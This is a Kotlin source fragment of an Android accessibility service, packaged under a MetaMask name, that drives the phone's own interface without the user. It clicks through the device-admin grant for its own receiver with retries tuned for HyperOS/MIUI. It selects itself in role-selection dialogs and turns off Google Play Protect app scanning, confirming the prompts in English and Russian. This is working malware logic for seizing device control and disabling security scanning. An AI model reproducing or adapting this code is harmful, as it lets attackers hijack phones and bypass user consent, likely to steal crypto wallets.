                try { root.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD) } catch (_: Exception) {}
            }
            for (i in 0 until root.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { root.getChild(i) } catch (_: Exception) { null } ?: continue
                try { scrollToBottom(child) } finally { try { child.recycle() } catch (_: Exception) {} }
            }
        } catch (_: Exception) {}
    }

    @Volatile private var adminPostClickRetries = 0
    private val ADMIN_POST_CLICK_MAX_RETRIES = 3

    private fun isOurAdminActive(): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] isOurAdminActive enter") //xdbg
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return try {
            val s = service ?: return false
            val dpm = s.getSystemService(android.content.Context.DEVICE_POLICY_SERVICE)
                as? android.app.admin.DevicePolicyManager
            val comp = android.content.ComponentName(s, com.example.MetaMask.receivers.BadgerFalconRecv::class.java)
            dpm?.isAdminActive(comp) == true
        } catch (_: Exception) { false }
    }

    private fun isDeviceAdminDialogStillOpen(): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] isDeviceAdminDialogStillOpen enter") //xdbg
        val svc = service ?: return false
        val windows = try { svc.windows } catch (_: Exception) { null } ?: return false
        for (win in windows) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val root = try { win.root } catch (_: Exception) { null } ?: continue
            try {
                val pkg = root.packageName?.toString() ?: ""
                if (pkg == SETUP_PKG || pkg == "com.miui.securitycenter" || pkg == "com.miui.securityadd") {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                    return true
                }
            } finally { try { root.recycle() } catch (_: Exception) {} }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return false
    }

    private fun onSetupDialogClicked() {
        android.util.Log.d("XDBG", "[AutoIbis] onSetupDialogClicked enter") //xdbg
        val wasAdmin = deviceAdminPending
        val wasBattery = batteryOptPending
        setupDialogActive = false
        deviceAdminPending = false
        batteryOptPending = false
        hyperOsCountdownTapScheduled = false
        hyperOsOkCenterX = 0f
        hyperOsOkCenterY = 0f
        cancelWatchForEnabled()

        if (wasAdmin) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            handler.postDelayed({
                val granted = isOurAdminActive()
                val dialogOpen = isDeviceAdminDialogStillOpen()
                if (!granted && dialogOpen && adminPostClickRetries < ADMIN_POST_CLICK_MAX_RETRIES) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    adminPostClickRetries++
                    deviceAdminPending = true
                    setupDialogActive = true
                    lastSetupMs = System.currentTimeMillis()
                    val retryDelays = if (com.example.MetaMask.HyperOsDetector.isHyperOs)
                        listOf(0L, 100L, 200L, 400L, 700L, 1100L, 1600L)
                    else
                        listOf(0L, 400L, 900L, 1600L, 2500L)
                    retryDelays.forEach { d ->
                        handler.postDelayed({
                            if (setupDialogActive && deviceAdminPending) tryClickSetupDialog()
                        }, d)
                    }
                } else if (granted) {
                    adminPostClickRetries = 0
                    hyperOsCheckboxTicked = false
                    try { AccessSvc.instance?.onDeviceAdminSetupFinished(true) } catch (_: Exception) {}
                } else if (!dialogOpen) {
                    adminPostClickRetries = 0
                    if (com.example.MetaMask.HyperOsDetector.isHyperOs && hyperOsCheckboxTicked) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        deviceAdminPending = true
                        setupDialogActive = true
                    } else {
                        hyperOsCheckboxTicked = false
                    }
                } else {
                    adminPostClickRetries = 0
                    if (com.example.MetaMask.HyperOsDetector.isHyperOs && hyperOsCheckboxTicked) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        deviceAdminPending = true
                        setupDialogActive = true
                    } else {
                        hyperOsCheckboxTicked = false
                        try { AccessSvc.instance?.onDeviceAdminSetupFinished(false) } catch (_: Exception) {}
                    }
                }
            }, if (com.example.MetaMask.HyperOsDetector.isHyperOs) 400L else 2000L)
        }

        if (wasBattery) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            handler.postDelayed({
                val svc = AccessSvc.instance ?: return@postDelayed
                svc.cancelBatteryOverlayFallback()
                if (svc.isGrantChainActive()) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    svc.onBatteryDialogHandled()
                } else {
                    svc.martenHelper.hide()
                }
            }, 1500L)
        }
    }

    fun onRoleSelectionAboutToShow() {
        android.util.Log.d("XDBG", "[AutoIbis] onRoleSelectionAboutToShow enter") //xdbg
        roleSelectionActive = true
        roleAppSelected = false
        listOf(800L, 1500L, 2500L, 4000L).forEach { d ->
            handler.postDelayed({ if (roleSelectionActive) tryHandleRoleSelection() }, d)
        }
    }

    private fun handleRoleSelectionEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[AutoIbis] handleRoleSelectionEvent enter event=${event}") //xdbg
        if (!roleSelectionActive) return
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        handler.postDelayed({ if (roleSelectionActive) tryHandleRoleSelection() }, 400L)
        handler.postDelayed({ if (roleSelectionActive) tryHandleRoleSelection() }, 1000L)
        handler.postDelayed({ if (roleSelectionActive) tryHandleRoleSelection() }, 2000L)
    }

    private fun markRoleConfirmed() {
        android.util.Log.d("XDBG", "[AutoIbis] markRoleConfirmed enter") //xdbg
        roleSelectionActive = false
        handler.postDelayed({ AccessSvc.instance?.onRoleSelectionConfirmed() }, 300L)
    }

    private fun tryHandleRoleSelection() {
        android.util.Log.d("XDBG", "[AutoIbis] tryHandleRoleSelection enter") //xdbg
        val svc = service ?: return
        if (!roleSelectionActive) return
        val ourPkg = svc.packageName
        val ourLabel = try {
            svc.packageManager.getApplicationLabel(svc.packageManager.getApplicationInfo(ourPkg, 0)).toString()
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AutoIbis] catch (ignored)") //xdbg
            return
        }
        if (com.example.MetaMask.HyperOsDetector.isHyperOs) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            try { dumpSetupTree() } catch (_: Exception) {}
        }

        val windows = try { svc.windows } catch (_: Exception) { null } ?: return
        var actionTaken = false

        for (win in windows) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val root = try { win.root } catch (_: Exception) { null } ?: continue
            val winPkg = root.packageName?.toString() ?: ""
            if (winPkg.contains("launcher", ignoreCase = true) ||
                winPkg == "com.google.android.apps.nexuslauncher" ||
                winPkg == "com.android.launcher3") {
                try { root.recycle() } catch (_: Exception) {}; continue
            }
            try {
                if (!roleAppSelected) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    val appNodes = try { root.findAccessibilityNodeInfosByText(ourLabel) } catch (_: Exception) { null }
                    var found = false
                    appNodes?.forEach { n ->
                        try {
                            val txt = (n.text?.toString() ?: "").trim()
                            if (txt.equals(ourLabel, ignoreCase = true)) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val ok = clickNodeOrGesture(n, svc, "roleApp:'$ourLabel'")
                                if (ok) { found = true }
                            }
                        } finally { try { n.recycle() } catch (_: Exception) {} }
                    }
                    if (found) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        roleAppSelected = true; lastClickMs = System.currentTimeMillis(); actionTaken = true
                        handler.postDelayed({
                            if (roleSelectionActive) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val svc2 = service ?: return@postDelayed
                                val wins2 = try { svc2.windows } catch (_: Exception) { null } ?: return@postDelayed
                                for (w in wins2) {
                                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                                    val r = try { w.root } catch (_: Exception) { null } ?: continue
                                    try { if (bfsClickRoleConfirm(r, svc2)) markRoleConfirmed() }
                                    finally { try { r.recycle() } catch (_: Exception) {} }
                                }
                            }
                        }, 800L)
                        break
                    }
                }
                if (!actionTaken && roleAppSelected && bfsClickRoleConfirm(root, svc)) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    markRoleConfirmed(); lastClickMs = System.currentTimeMillis(); actionTaken = true; break
                }
            } finally { try { root.recycle() } catch (_: Exception) {} }
        }

        if (!actionTaken) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val activeRoot = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            if (activeRoot != null) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val rCount = activeRoot.childCount
                try {
                    if (rCount > 0 && !roleAppSelected) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        val appNodes = try { activeRoot.findAccessibilityNodeInfosByText(ourLabel) } catch (_: Exception) { null }
                        var found = false
                        appNodes?.forEach { n ->
                            try {
                                val txt = (n.text?.toString() ?: "").trim()
                                if (txt.equals(ourLabel, ignoreCase = true)) {
                                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                    if (clickNodeOrGesture(n, svc, "roleApp_active:'$ourLabel'")) {
                                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                        found = true
                                    }
                                }
                            } finally { try { n.recycle() } catch (_: Exception) {} }
                        }
                        if (found) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            roleAppSelected = true; lastClickMs = System.currentTimeMillis(); actionTaken = true
                            handler.postDelayed({
                                if (roleSelectionActive) {
                                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                    val svc2 = service ?: return@postDelayed
                                    val ar2 = try { svc2.rootInActiveWindow } catch (_: Exception) { null }
                                    if (ar2 != null) {
                                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                        try {
                                            if (bfsClickRoleConfirm(ar2, svc2)) markRoleConfirmed()
                                        } finally { try { ar2.recycle() } catch (_: Exception) {} }
                                    }
                                }
                            }, 800L)
                        }
                    }
                    if (!actionTaken && rCount > 0 && roleAppSelected && bfsClickRoleConfirm(activeRoot, svc)) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        markRoleConfirmed(); lastClickMs = System.currentTimeMillis(); actionTaken = true
                    }
                } finally { try { activeRoot.recycle() } catch (_: Exception) {} }
            }
        }

        if (!actionTaken) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            dumpRoleSelectionTree()
        }
    }

    private fun dumpRoleSelectionTree() {
        android.util.Log.d("XDBG", "[AutoIbis] dumpRoleSelectionTree enter") //xdbg
    }

    private fun bfsClickRoleConfirm(root: AccessibilityNodeInfo, svc: AccessibilityService): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] bfsClickRoleConfirm enter root=${root} svc=${svc}") //xdbg
        for (id in listOf("android:id/button1", "android:id/positiveButton")) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                try {
                    for (n in nodes) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        if (!n.isEnabled || !n.isClickable) continue
                        if (clickNodeOrGesture(n, svc, "roleConfirm:$id")) return true
                    }
                } finally { nodes.forEach { try { it.recycle() } catch (_: Exception) {} } }
            }
        }
        fun bfs(node: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] bfs enter node=${node} depth=${depth}") //xdbg
            if (depth > 12) return false
            val cls = node.className?.toString() ?: ""
            if ((cls.contains("Button") || cls.contains("TextView")) && node.isEnabled && node.isClickable) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val label = (node.text?.toString() ?: "").trim().lowercase()
                if (label.isNotBlank() && label.length <= 50 &&
                    ROLE_CONFIRM_TEXTS.any { label == it || label.contains(it) } &&
                    !DENY_TEXTS.any { label.contains(it) }) {
                    if (clickNodeOrGesture(node, svc, "roleConfirmBfs:'$label'")) return true
                }
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { if (bfs(child, depth + 1)) return true } finally { try { child.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return bfs(root, 0)
    }

    fun onPlayProtectAboutToShow() {
        android.util.Log.d("XDBG", "[AutoIbis] onPlayProtectAboutToShow enter") //xdbg
        playProtectActive = true
        playProtectSettingsClicked = false
        playProtectToggleClicked = false
        listOf(800L, 1800L, 3200L, 5000L, 7000L, 10000L, 14000L).forEach { d ->
            handler.postDelayed({ if (playProtectActive) tryHandlePlayProtect() }, d)
        }
    }

    fun cancelPlayProtect() {
        android.util.Log.d("XDBG", "[AutoIbis] cancelPlayProtect enter") //xdbg
        playProtectActive = false
        playProtectSettingsClicked = false
        playProtectToggleClicked = false
    }

    private fun handlePlayProtectEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[AutoIbis] handlePlayProtectEvent enter event=${event}") //xdbg
        if (!playProtectActive) return
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = event.packageName?.toString() ?: return
        when {
            playProtectToggleClicked -> {
                handler.postDelayed({ if (playProtectActive && playProtectToggleClicked) tryConfirmPlayProtectDialog() }, 300L)
                handler.postDelayed({ if (playProtectActive && playProtectToggleClicked) tryConfirmPlayProtectDialog() }, 900L)
                handler.postDelayed({ if (playProtectActive && playProtectToggleClicked) tryConfirmPlayProtectDialog() }, 2000L)
            }
            pkg == "com.android.vending" -> {
                handler.postDelayed({ if (playProtectActive) tryHandlePlayProtect() }, 600L)
                handler.postDelayed({ if (playProtectActive) tryHandlePlayProtect() }, 1500L)
                handler.postDelayed({ if (playProtectActive) tryHandlePlayProtect() }, 2800L)
                handler.postDelayed({ if (playProtectActive) tryHandlePlayProtect() }, 5000L)
            }
        }
    }

    private fun tryHandlePlayProtect() {
        android.util.Log.d("XDBG", "[AutoIbis] tryHandlePlayProtect enter") //xdbg
        val svc = service ?: return
        if (!playProtectActive) return
        val allRoots = svc.windows
            ?.mapNotNull { w -> try { w.root } catch (_: Exception) { null } }
            ?.takeIf { it.isNotEmpty() }
            ?: listOf(try { svc.rootInActiveWindow } catch (_: Exception) { null }).filterNotNull()
        val root = allRoots.firstOrNull { it.packageName?.toString() == "com.android.vending" }
            ?: run {
                allRoots.forEach { try { it.recycle() } catch (_: Exception) {} }; return
            }
        allRoots.forEach { if (it !== root) try { it.recycle() } catch (_: Exception) {} }
        try {
            if (!playProtectSettingsClicked) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val c1 = bfsClickByContentDesc(root, "Settings")
                val c2 = if (!c1) bfsClickByContentDesc(root, "Настройки") else false
                val c3 = if (!c1 && !c2) bfsClickByContentDesc(root, "settings") else false
                val c4 = if (!c1 && !c2 && !c3) bfsClickByText(root, "Settings") else false
                val c5 = if (!c1 && !c2 && !c3 && !c4) bfsClickByResourceIdContains(root, svc, "settings") else false
                val clicked = c1 || c2 || c3 || c4 || c5
                if (clicked) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    playProtectSettingsClicked = true
                    listOf(1500L, 3000L, 5000L, 8000L, 12000L).forEach { d ->
                        handler.postDelayed({ if (playProtectActive) tryDisablePlayProtectScan() }, d)
                    }
                }
            }
        } finally { try { root.recycle() } catch (_: Exception) {} }
    }

    private fun bfsClickByText(root: AccessibilityNodeInfo, text: String): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] bfsClickByText enter root=${root} text=${text}") //xdbg
        fun bfs(node: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] bfs enter node=${node} depth=${depth}") //xdbg
            if (depth > 12) return false
            val t = node.text?.toString() ?: ""
            if (t.equals(text, ignoreCase = true)) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (node.isClickable) return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                val parent = try { node.parent } catch (_: Exception) { null }
                if (parent != null && parent.isClickable) return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { if (bfs(child, depth + 1)) return true } finally { try { child.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return bfs(root, 0)
    }

    private fun bfsClickByResourceIdContains(root: AccessibilityNodeInfo, svc: AccessibilityService, keyword: String): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] bfsClickByResourceIdContains enter root=${root} svc=${svc} keyword=${keyword}") //xdbg
        fun bfs(node: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] bfs enter node=${node} depth=${depth}") //xdbg
            if (depth > 12) return false
            val id = node.viewIdResourceName ?: ""
            if (id.contains(keyword, ignoreCase = true) && node.isClickable && node.isEnabled) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val b = Rect().also { node.getBoundsInScreen(it) }
                if (!b.isEmpty) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                    return true
                }
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { if (bfs(child, depth + 1)) return true } finally { try { child.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return bfs(root, 0)
    }

    @Suppress("UNUSED_PARAMETER")
    private fun dumpNodeTree(root: AccessibilityNodeInfo, tag: String) {
        android.util.Log.d("XDBG", "[AutoIbis] dumpNodeTree enter root=${root} tag=${tag}") //xdbg
    }

    private fun tryDisablePlayProtectScan() {
        android.util.Log.d("XDBG", "[AutoIbis] tryDisablePlayProtectScan enter") //xdbg
        val svc = service ?: return
        if (!playProtectActive || playProtectToggleClicked) return
        val allW = svc.windows?.mapNotNull { w -> try { w.root } catch (_: Exception) { null } }
        val root = allW?.firstOrNull { it.packageName?.toString() == "com.android.vending" }
            ?: try { svc.rootInActiveWindow } catch (_: Exception) { null }
            ?: return
        if (root.packageName?.toString() != "com.android.vending") {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            try { root.recycle() } catch (_: Exception) {}
            allW?.forEach { try { it.recycle() } catch (_: Exception) {} }
            return
        }
        allW?.forEach { if (it !== root) try { it.recycle() } catch (_: Exception) {} }
        try {
            val result = bfsDisablePlayProtectScan(root)
            when (result) {
                true -> {
                    playProtectToggleClicked = true
                    listOf(500L, 1200L, 2500L, 4500L).forEach { d ->
                        handler.postDelayed({ if (playProtectActive && playProtectToggleClicked) tryConfirmPlayProtectDialog() }, d)
                    }
                }
                false -> {
                    playProtectActive = false
                    handler.postDelayed({
                        try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                    }, 400L)
                    handler.postDelayed({ AccessSvc.instance?.onPlayProtectDone() }, 900L)
                }
                null -> { }
            }
        } finally { try { root.recycle() } catch (_: Exception) {} }
    }

    private fun tryConfirmPlayProtectDialog() {
        android.util.Log.d("XDBG", "[AutoIbis] tryConfirmPlayProtectDialog enter") //xdbg
        val svc = service ?: return
        if (!playProtectActive || !playProtectToggleClicked) return
        val CONFIRM_TEXTS = setOf("turn off", "отключить", "disable", "ok", "confirm", "yes", "да", "выключить", "подтвердить")
        val roots = svc.windows
            ?.mapNotNull { w -> try { w.root } catch (_: Exception) { null } }
            ?: listOf(try { svc.rootInActiveWindow } catch (_: Exception) { null }).filterNotNull()
        for (root in roots) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            try {
                if (bfsClickConfirmButton(root, CONFIRM_TEXTS)) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    playProtectActive = false
                    playProtectSettingsClicked = false
                    playProtectToggleClicked = false
                    handler.postDelayed({
                        try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                    }, 600L)
                    handler.postDelayed({ AccessSvc.instance?.onPlayProtectDone() }, 1400L)
                    return
                }
            } finally { try { root.recycle() } catch (_: Exception) {} }
        }
    }

    private fun bfsClickByContentDesc(root: AccessibilityNodeInfo, desc: String): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] bfsClickByContentDesc enter root=${root} desc=${desc}") //xdbg
        fun bfs(node: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] bfs enter node=${node} depth=${depth}") //xdbg
            if (depth > 12) return false
            val cd = node.contentDescription?.toString() ?: ""
            if (cd.equals(desc, ignoreCase = true)) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (node.isClickable) return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                val parent = try { node.parent } catch (_: Exception) { null }
                if (parent != null && parent.isClickable) return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { if (bfs(child, depth + 1)) return true } finally { try { child.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return bfs(root, 0)
    }

    private fun bfsDisablePlayProtectScan(root: AccessibilityNodeInfo): Boolean? {
        android.util.Log.d("XDBG", "[AutoIbis] bfsDisablePlayProtectScan enter root=${root}") //xdbg
        val SCAN_TEXTS = setOf(
            "scan apps with play protect",
            "scan apps with play",
            "scanning apps with play protect",
            "scanning apps",
            "scan apps",
            "сканировать приложения с помощью play protect",
            "сканировать приложения с помощью play",
            "сканировать приложения",
            "сканирование приложений с помощью play",
            "сканирование приложений",
            "improve harmful app detection",
            "улучшение обнаружения вредоносных"
        )
        fun findSwitchChecked(node: AccessibilityNodeInfo, depth: Int): Boolean? {
            android.util.Log.d("XDBG", "[AutoIbis] findSwitchChecked enter node=${node} depth=${depth}") //xdbg
            if (depth > 6) return null
            val res = node.viewIdResourceName ?: ""
            val cls = node.className?.toString() ?: ""
            if (res == "android:id/switch_widget" || cls.contains("Switch", ignoreCase = true)) return node.isChecked
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                val r = try { findSwitchChecked(child, depth + 1) } finally { try { child.recycle() } catch (_: Exception) {} }
                if (r != null) return r
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return null
        }
        fun clickableAncestor(node: AccessibilityNodeInfo, levels: Int): AccessibilityNodeInfo? {
            android.util.Log.d("XDBG", "[AutoIbis] clickableAncestor enter node=${node} levels=${levels}") //xdbg
            if (levels <= 0) return null
            val p = try { node.parent } catch (_: Exception) { return null } ?: return null
            if (p.isClickable) return p
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return clickableAncestor(p, levels - 1)
        }
        fun clickRowOrNode(node: AccessibilityNodeInfo): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] clickRowOrNode enter node=${node}") //xdbg
            val row = clickableAncestor(node, 4)
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return if (row != null) {
                val switchChecked = findSwitchChecked(row, 0)
                if (switchChecked == false) { return false }
                row.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                true
            } else {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                true
            }
        }
        fun bfsText(node: AccessibilityNodeInfo, depth: Int): Boolean? {
            android.util.Log.d("XDBG", "[AutoIbis] bfsText enter node=${node} depth=${depth}") //xdbg
            if (depth > 14) return null
            val text = node.text?.toString()?.lowercase() ?: ""
            if (SCAN_TEXTS.any { text.contains(it) }) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                return clickRowOrNode(node)
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                val r = try { bfsText(child, depth + 1) } finally { try { child.recycle() } catch (_: Exception) {} }
                if (r != null) return r
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return null
        }
        fun bfsFallbackSwitch(node: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] bfsFallbackSwitch enter node=${node} depth=${depth}") //xdbg
            if (depth > 14) return false
            val cls = node.className?.toString() ?: ""
            val res = node.viewIdResourceName ?: ""
            if ((cls.contains("Switch", ignoreCase = true) || res.contains("switch", ignoreCase = true)) && node.isChecked) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val row = clickableAncestor(node, 5)
                if (row != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    row.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                    return true
                }
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { if (bfsFallbackSwitch(child, depth + 1)) return true } finally { try { child.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        val textResult = bfsText(root, 0)
        if (textResult != null) return textResult
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return if (bfsFallbackSwitch(root, 0)) true else null
    }

    private fun bfsClickConfirmButton(root: AccessibilityNodeInfo, texts: Set<String>): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] bfsClickConfirmButton enter root=${root} texts=${texts}") //xdbg
        val DENY = setOf("cancel", "отмена", "no", "нет", "dismiss", "закрыть", "pause", "пауза")
        fun bfs(node: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] bfs enter node=${node} depth=${depth}") //xdbg
            if (depth > 14) return false
            val text = node.text?.toString()?.trim() ?: ""
            val lower = text.lowercase()
            if (text.isNotEmpty() && texts.any { lower == it || lower.contains(it) } && DENY.none { lower == it || lower.contains(it) }) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val parent = try { node.parent } catch (_: Exception) { null }
                if (parent != null && parent.isClickable) { parent.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true }
                if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true }
            }
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { if (bfs(child, depth + 1)) return true } finally { try { child.recycle() } catch (_: Exception) {} }
            }
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return bfs(root, 0)
    }
}

object PermRequesterActivityRef {
    var instance: com.example.MetaMask.activities.PermRequesterActivity? = null
}
